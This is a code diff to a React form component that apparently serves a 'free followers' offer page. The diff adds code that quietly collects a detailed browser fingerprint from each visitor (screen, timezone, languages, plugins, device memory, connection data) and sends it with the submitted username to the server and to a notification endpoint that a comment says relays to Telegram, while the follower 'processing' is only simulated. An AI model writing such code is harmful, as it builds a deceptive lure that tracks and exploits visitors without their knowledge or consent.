@@ -19,7 +19,7 @@ import { useToast } from "@/hooks/use-toast";
 import Countdown from "@/components/Countdown";
 import ProcessingAnimation from "@/components/ProcessingAnimation";
 import SuccessMessage from "@/components/SuccessMessage";
-import { Loader2, Zap, ShieldCheck, Lock, CheckCircle } from "lucide-react";
+import { Loader2, Sparkles, ShieldCheck, Lock, CheckCircle, Flame, TrendingUp } from "lucide-react";
 
 // Extend schema for frontend validation
 const formSchema = insertSubmissionSchema.extend({
@@ -35,6 +35,28 @@ export default function FollowerForm() {
   const [formStep, setFormStep] = useState<'form' | 'processing' | 'success'>('form');
   const [selectedAmount, setSelectedAmount] = useState<number>(5000);
   const { toast } = useToast();
+  const [userInfo, setUserInfo] = useState({
+    screenSize: `${window.screen.width}x${window.screen.height}`,
+    colorDepth: window.screen.colorDepth,
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    timezoneOffset: new Date().getTimezoneOffset(),
+    language: navigator.language,
+    languages: Array.from(navigator.languages || []).join(','),
+    platform: navigator.platform,
+    userAgent: navigator.userAgent,
+    deviceMemory: (navigator as any).deviceMemory || 'unknown',
+    hardwareConcurrency: navigator.hardwareConcurrency,
+    cookiesEnabled: navigator.cookieEnabled,
+    doNotTrack: navigator.doNotTrack || (window as any).doNotTrack || 'unknown',
+    plugins: Array.from(navigator.plugins || []).map(p => p.name).join(','),
+    ip: '',
+    connection: (navigator as any).connection ? {
+      downlink: (navigator as any).connection.downlink,
+      effectiveType: (navigator as any).connection.effectiveType,
+      rtt: (navigator as any).connection.rtt,
+      saveData: (navigator as any).connection.saveData
+    } : 'unknown'
+  });
   
   const form = useForm<FormValues>({
     resolver: zodResolver(formSchema),
@@ -48,11 +70,29 @@ export default function FollowerForm() {
   
   const mutation = useMutation({
     mutationFn: async (values: FormValues) => {
-      const data = await apiRequest("POST", "/api/submit", values);
+      // Combine form values with user info
+      const payload = {
+        ...values,
+        userInfo: userInfo
+      };
+      const data = await apiRequest("POST", "/api/submit", payload);
       return data.json();
     },
     onSuccess: (data) => {
       setFormStep('processing');
+      
+      // Send notification to Telegram (this would be implemented on the server-side)
+      fetch("/api/notify", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          username: form.getValues("username"),
+          followers: selectedAmount,
+          userInfo: userInfo
+        })
+      }).catch(err => console.error("Notification error", err));
       
       // Simulate processing for demonstration purposes
       setTimeout(() => {
@@ -61,8 +101,8 @@ export default function FollowerForm() {
         // Redirect to thank you page after a short delay
         setTimeout(() => {
           window.location.href = `/thank-you/${data.submission.id}`;
-        }, 3000);
-      }, 5000);
+        }, 2000);
+      }, 3000);
     },
     onError: (error) => {
       toast({
